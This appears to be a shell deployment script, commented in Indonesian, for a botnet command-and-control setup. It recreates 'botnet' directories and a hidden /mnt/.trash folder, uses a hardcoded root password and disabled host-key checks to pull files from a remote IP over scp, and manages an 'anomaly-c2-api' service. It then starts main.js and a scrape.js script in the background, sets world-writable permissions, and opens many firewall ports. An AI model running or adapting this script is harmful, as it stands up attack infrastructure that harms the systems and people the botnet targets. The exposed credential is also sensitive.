DEBIAN_FRONTEND=noninteractive apt install -y sshpass build-essential squid
rm -rf /mnt/.trash
rm -rf /root/botnet
rm -rf /www/botnet
mkdir /mnt/.trash
cd /mnt/.trash

# Memindahkan file dengan scp
sshpass -p 'lexcz1VPS' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@167.71.196.235:/var/file/* ./

systemctl stop anomaly-c2-api || echo 'anomaly-c2-api tidak ditemukan'
systemctl disable anomaly-c2-api || echo 'anomaly-c2-api tidak terdaftar'

# Menginstal NVM dan Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install node || echo 'Node.js sudah terpasang'

# Instalasi npm dan pm2
npm install
npm install -g pm2
pm2 stop all || echo 'Tidak ada layanan PM2 yang sedang berjalan'
pm2 start main.js
pm2 startup
pm2 save
pm2 restart all

# Mengatur firewall
ufw reload

# Menjalankan skrip perbaikan


# Menyimpan izin
cd ./lib/cache
chmod 777 *

# Memulai proses di screen
cd ../..
screen -dm node ./lib/cache/scrape.js

# Mengatur firewall untuk port yang diperlukan
ufw allow 4343
ufw allow 1201
ufw allow 22
ufw allow 443
ufw allow 80
ufw allow 2022
ufw allow 3306
ufw allow 8080
ufw reload

